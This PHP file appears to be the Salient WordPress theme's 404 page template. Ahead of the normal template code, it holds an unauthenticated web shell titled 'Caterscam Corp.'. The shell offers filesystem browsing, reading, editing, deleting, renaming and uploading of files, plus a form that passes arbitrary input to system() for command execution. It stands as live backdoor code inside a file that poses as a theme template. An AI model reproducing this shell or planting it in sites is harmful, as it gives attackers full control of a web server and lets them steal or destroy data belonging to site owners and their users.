<?php
error_reporting(0);

echo "<!DOCTYPE html>
<html>
<head>
    <title>Caterscam Corp.</title>
    <style>
        body { font-family: monospace; background-color: #f9f9f9; padding: 20px; }
        pre { font-size: 14px; }
        .cmd-section { margin-top: 20px; }
        .cmd-form { display: flex; gap: 10px; align-items: center; margin-bottom: 10px; }
        .cmd-form input[type='text'] { flex: 1; padding: 5px; font-family: monospace; font-size: 14px; }
        .cmd-form input[type='submit'] { padding: 5px 10px; }
        textarea { width: 100%; height: 200px; font-family: monospace; font-size: 14px; }
        a { text-decoration: none; color: #0645AD; }
        a.visited { color: #b58900 !important; font-weight: bold; }
    </style>
    <script>
        // Tambahkan kelas 'visited' jika sudah diklik sebelumnya
        document.addEventListener('DOMContentLoaded', function() {
            document.querySelectorAll('a').forEach(function(link) {
                if (localStorage.getItem(link.href)) {
                    link.classList.add('visited');
                }

                link.addEventListener('click', function() {
                    localStorage.setItem(link.href, '1');
                });
            });
        });
    </script>
</head>
<body><pre>";

$cwd = realpath($_GET['path'] ?? getcwd());
if (!$cwd || !file_exists($cwd)) $cwd = getcwd();

// Handle delete
if (isset($_GET['del'])) {
    $target = realpath($_GET['del']);
    if (is_file($target)) {
        echo unlink($target) ? "[+] File deleted: $target\n" : "[-] Failed to delete file\n";
    } elseif (is_dir($target)) {
        echo rmdir($target) ? "[+] Directory deleted: $target\n" : "[-] Failed to delete directory\n";
    }
}

// Handle rename
if (isset($_GET['rename'], $_POST['newname'])) {
    $old = realpath($_GET['rename']);
    $new = dirname($old) . '/' . basename($_POST['newname']);
    echo rename($old, $new) ? "[+] Renamed to: $new\n" : "[-] Rename failed\n";
}

// Handle file save
if (isset($_GET['edit'], $_POST['content'])) {
    $file = $cwd . '/' . basename($_GET['edit']);
    echo file_put_contents($file, $_POST['content']) !== false ? "[+] File saved: $file\n" : "[-] Save failed\n";
}

// Handle file upload
if (isset($_POST["upload"]) && isset($_FILES["up"])) {
    $up = $_FILES["up"];
    $dest = $cwd . "/" . basename($up["name"]);
    echo move_uploaded_file($up["tmp_name"], $dest) ? "[+] Uploaded: " . $up["name"] . "\n" : "[-] Upload failed\n";
}

// Breadcrumb
echo "<b>Current Dir:</b> ";
$parts = explode("/", trim($cwd, "/"));
$build = "";
echo "<a href='?path=/'>/</a>";
foreach ($parts as $part) {
    $build .= "/" . $part;
    echo "<a href='?path=" . urlencode($build) . "'>$part</a>/";
}
echo "\n\n";

// Directory listing: pisahkan dir dan file
$files = scandir($cwd);
natcasesort($files);

$dirs = [];
$regularFiles = [];

foreach ($files as $f) {
    if ($f === "." || $f === "..") continue;
    $full = $cwd . '/' . $f;
    is_dir($full) ? $dirs[] = $f : $regularFiles[] = $f;
}

// Tampilkan direktori dulu
foreach ($dirs as $f) {
    $full = $cwd . '/' . $f;
    echo "[DIR]  <a href='?path=" . urlencode($full) . "'>$f</a> ";
    echo "[ <a href='?del=" . urlencode($full) . "'>delete</a> | ";
    echo "<a href='?rename=" . urlencode($full) . "'>rename</a> ]\n";
}

// Lalu file
foreach ($regularFiles as $f) {
    $full = $cwd . '/' . $f;
    echo "[FILE] <a href='?path=" . urlencode($cwd) . "&read=" . urlencode($f) . "'>$f</a> ";
    echo "[ <a href='?path=" . urlencode($cwd) . "&edit=" . urlencode($f) . "'>edit</a> | ";
    echo "<a href='?del=" . urlencode($full) . "'>delete</a> | ";
    echo "<a href='?rename=" . urlencode($full) . "'>rename</a> ]\n";
}

// File viewer
if (isset($_GET['read'])) {
    $target = realpath($cwd . '/' . $_GET['read']);
    if ($target && is_file($target)) {
        echo "\n<b>Viewing:</b> " . htmlspecialchars($target) . "\n\n";
        echo htmlspecialchars(file_get_contents($target));
    }
}

// Edit form
if (isset($_GET['edit']) && !isset($_POST['content'])) {
    $file = $cwd . '/' . basename($_GET['edit']);
    $content = htmlspecialchars(@file_get_contents($file));
    echo "<form method='POST'>
    <textarea name='content'>$content</textarea><br>
    <input type='submit' value='Save'>
    </form>";
}

// Rename form
if (isset($_GET['rename']) && !isset($_POST['newname'])) {
    echo "<form method='POST'>
    Rename to: <input type='text' name='newname'>
    <input type='submit' value='Rename'>
    </form>";
}

// Upload form
echo "<br><form method='POST' enctype='multipart/form-data'>
<b>Upload File:</b> <input type='file' name='up'><input type='submit' name='upload' value='Upload'><br>
</form>";

// Command Execution
echo "<div class='cmd-section'>
<form method='POST' class='cmd-form'>
    <label><b>CMD:</b></label>
    <input type='text' name='cmd'>
    <input type='submit' value='Exec'>
</form>";

if (!empty($_POST["cmd"])) {
    echo "<div>
        <b>CMD Output:</b><br>
        <textarea readonly>";
    system($_POST["cmd"]);
    echo "</textarea></div>";
}

echo "</div></pre></body></html>";
?>


<?php 
/**
 * The template for 404 not found.
 *
 * @package Salient WordPress Theme
 * @version 15.5
 */

// Exit if accessed directly
if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

get_header();

$page_404_font_color       = ( ! empty( $nectar_options['page-404-font-color'] ) ) ? $nectar_options['page-404-font-color'] : '';
$page_404_bg_image         = ( ! empty( $nectar_options['page-404-bg-image'] ) && isset( $nectar_options['page-404-bg-image'] ) ) ? nectar_options_img( $nectar_options['page-404-bg-image'] ) : null;
$page_404_bg_image_overlay = ( ! empty( $nectar_options['page-404-bg-image-overlay-color'] ) ) ? $nectar_options['page-404-bg-image-overlay-color'] : '';
$page_404_home_button      = ( ! empty( $nectar_options['page-404-home-button'] ) ) ? $nectar_options['page-404-home-button'] : '';

?>

<div class="container-wrap">
	
	<?php
	if ( ! empty( $page_404_bg_image ) ) {
		echo '<div class="error-404-bg-img" style="background-image: url(' . esc_url( $page_404_bg_image ) . ');"></div>';

		if ( ! empty( $page_404_bg_image_overlay ) ) {
			 echo '<div class="error-404-bg-img-overlay"></div>';
		}
	}
	?>
	
	<div class="container main-content">
		
		<div class="row">
			
			<div class="col span_12">
				
				<?php nectar_hook_404_content(); ?>
				<?php if ( !has_action('nectar_hook_404_content') ) { ?>
					<div id="error-404" 
					<?php
					if ( ! empty( $page_404_font_color ) ) {
						echo 'data-cc="true"'; }
					?>
					>
						<h1><?php echo esc_html__( '404', 'salient' ); ?></h1>
						<h2><?php echo esc_html__( 'Page Not Found', 'salient' ); ?></h2>
						
						<?php if ( $page_404_home_button === '1' ) { ?>
							<a class="nectar-button large regular-button accent-color has-icon" data-color-override="false" data-hover-color-override="false" href="<?php echo esc_url( home_url() ); ?>"><span><?php echo esc_html__( 'Back Home', 'salient' ); ?> </span><i class="icon-button-arrow"></i></a>
							<?php } ?>
					</div>
				<?php } ?>
				
			</div><!--/span_12-->
			
		</div><!--/row-->
		
	</div><!--/container-->
	<?php nectar_hook_before_container_wrap_close(); ?>
</div><!--/container-wrap-->
<?php get_footer(); ?>
